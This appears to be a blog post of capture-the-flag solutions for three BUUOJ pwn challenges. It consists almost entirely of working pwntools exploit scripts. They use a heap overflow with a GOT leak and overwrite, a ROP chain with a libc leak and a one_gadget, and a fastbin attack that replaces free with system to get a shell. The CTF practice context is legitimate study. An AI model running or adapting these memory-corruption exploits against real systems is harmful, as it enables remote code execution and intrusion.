---
toc: true
classes: wide
layout: single
title:  "Buuoj PWN 题目冲分过程2（指俯冲）"
date:   2021-01-03 00:10:38 +0800
categories: 
  - pwn
---

# Buuoj PWN 题目冲分过程2（指俯冲）


## Problems

### babyfengshui_33c3_2016

```python

#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './babyfengshui_33c3_2016'
e = ELF(filename)
p = process(filename)
# p = remote("node3.buuoj.cn", 29672)

def Add(name, text, text_buf_len=None, text_len=None):
    """
    struct st { char* desc; char name[0x7c]; };
    输入 description 长度，malloc指定长度得ptr_desc，然后memset置零
    再malloc(0x80),同样置零得ptr_st，这个应该是一个结构体，ptr_st.ptr_desc = ptr_desc
    结构体指针数组 arr_st[index] = ptr_st
    然后f1 get_name(arr_st[index].name, 0x7c) -> fgets(v0, v1, STDIN), strchr(v0, 0x0a)[0]=0
    index+=1
    f2 get_text(index-1) -> if check arr_st[a0].desc+len < (arr_st[a0] - 4) <---- &(chunk.size), then get_name(arr_st[a0].desc, len+1) 
    """
    p.sendlineafter(b'Action: ', b'0')
    p.sendlineafter(b'size of description: ', bytes(f'{text_buf_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'name: ', name)
    p.sendlineafter(b'text length: ', bytes(f'{text_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'text: ', text)


def Delete(index):
    """
    free(arr_st[a0].desc)
    free(arr_st[a0])
    arr_st[0] = NULL
    """
    p.sendlineafter(b'Action: ', b'1')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))


def Display(index):
    """
    printf("%s", arr_st[a0].name)
    printf("%s", arr_st[a0].desc)
    """
    p.sendlineafter(b'Action: ', b'2')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))


def Update(index, text, text_len=None):
    """"""
    p.sendlineafter(b'Action: ', b'3')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))
    p.sendlineafter(b'text length: ', bytes(f'{text_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'text: ', text)


def Exit():
    p.sendlineafter(b'Action: ', b'4')


Add(b'name0', b'desc0', text_buf_len=0x10-8)  # index=0, 0x10 0x88, x
Add(b'name1', b'desc1', text_buf_len=0x10-8)  # index=1, 0x10 0x88
Add(b'name2', b'desc2', text_buf_len=0x10-8)  # index=2, 0x10 0x88, x
Add(b'/bin/sh', b'/bin/sh')  # index=3, 0x10 0x88, 

c_func_name = 'free'
c_func_got = e.got[c_func_name]

Delete(0)
Delete(2)
payload_leak_got = b'x' * (0x88 - 8) + \
    b'xxxx' + p32(0x10|0x1) + b'x'*8 + \
    b'yyyy' + p32(0x88|0x1) + p32(c_func_got) + b'\x00'

Add(b'name4', payload_leak_got, text_buf_len=0x80-0x8)  # index=4
Display(1)
p.recvuntil(b'description: ')
c_func_addr = u32(p.recv(4))
log.success(f'c: {c_func_name}() address={hex(c_func_addr)}')

searcher = LibcSearcher(func=c_func_name, address=c_func_addr)
c_base_addr = c_func_addr - searcher.dump(c_func_name)
system_addr = c_base_addr + searcher.dump('system')

log.success(f'c base address={hex(c_base_addr)}; system()={hex(system_addr)}')

Update(1, p32(system_addr) + b'zzzz')

Delete(3)
p.interactive()
```

### jarvisOJ_level3_x64

```python
#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './level3_x64'
# p = process(filename)
p = remote('node3.buuoj.cn', 28216)
elf = ELF(filename)
# libc = ELF('/home/ubuntu/glibc-2.23/lib/libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc/jarvisOJ_level3_x64-libc-2.19.so')
libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')

pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1

log.info(f'write@plt={hex(elf.plt["write"])}, write in symbols: {hex(libc.sym["write"])}')

payload = b'a'*(0x80+8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(elf.got["write"]) + p64(0) + p64(elf.plt["write"]) + p64(elf.sym["main"])
p.sendlineafter(b'Input:\n', payload)

write_address = u64(p.recv(8))

searcher = LibcSearcher()
searcher.add_condition('write', write_address)


base_address = write_address - libc.sym['write']
# base_address = write_address - searcher.dump('write')

# gadgets = [0x4527a, 0xf0364, 0xf1207, 0x45226]
# gadgets = [0x4647c, 0xe5765, 0xe66bd, 0x46428]
gadgets = [0x4526a, 0xf02a4, 0xf1147, 0x45216]

one_gadget = gadgets[1] + base_address
log.info(f'write={hex(write_address)}, libc={hex(base_address)}, gadget={hex(one_gadget)}')

payload = b'a'*(0x80+8) + p64(one_gadget)
p.sendlineafter(b'Input:\n', payload)
p.interactive()
```

### [ZJCTF 2019]EasyHeap

```python
#!/usr/bin/python3.6
from pwn import *

filename = './easyheap'
# p = process(filename)
p = remote('node3.buuoj.cn', 26098)
elf = ELF(filename)
# libc = ELF('/home/ubuntu/glibc-2.23/lib/libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc/jarvisOJ_level3_x64-libc-2.19.so')
# libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')


def heap_create(content, size=None):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Size of Heap : ', bytes(f'{size or (len(content) + 1)}', encoding='utf8'))
    p.sendlineafter(b'Content of heap:', content)

def heap_edit(index, content, size=None):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', bytes(f'{index}', encoding='utf8'))
    p.sendlineafter(b'Size of Heap : ', bytes(f'{size or (len(content) + 1)}', encoding='utf8'))
    p.sendlineafter(b'Content of heap : ', content)

def heap_delete(index):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :',  bytes(f'{index}', encoding='utf8'))

fake_chunk = 0x6020ad  # x/16gx 0x6020c0-0x10+5-8

heap_create(b'@@@@@@@@', size=0x18)     # 0, 0x20
heap_create(b'!!!!!!!!', size=0x18)     # 1, 0x20
heap_create(b'????????', size=0x68)     # 2, 0x70
heap_delete(2)                          # return 2 to fastbin
heap_edit(1, b'}' * 0x18 + p64(0x71) + p64(fake_chunk) + p64(fake_chunk))  # Set fast chunk's fd
heap_create(b']]]]]]]]', size=0x68)     # 2, 0x70, get the original chunk of 2
heap_create(b'[[[[[[[[', size=0x68)     # 3, 0x70, get the fake chunk
# -_-||| cat: /home/pwn/flag: No such file or directory
# heap_edit(3, b':'*(0x6020c0-0x6020bd) + p64(0x1333))


# https://n0vice.top/2020/04/25/%E5%B8%B8%E8%A7%81fastbin-attack%E5%A5%97%E8%B7%AF%E5%AD%A6%E4%B9%A0/
# 写入system的plt地址到free的got，再free(/bin/sh)
heap_array = 0x6020e0  # p/x &heaparray
log.info(f'free@got={hex(elf.got["free"])}, system@plt={hex(elf.plt["system"])}')
heap_edit(3, b':'*(0x6020e0-(fake_chunk + 0x10)) + p64(elf.got["free"]))
heap_edit(0, p64(elf.plt["system"]))
heap_edit(2, b'/bin/sh')
heap_delete(2)

# p.sendlineafter(b'Your choice :', bytes(f'{0x1305}', encoding='utf8'))
p.interactive()
```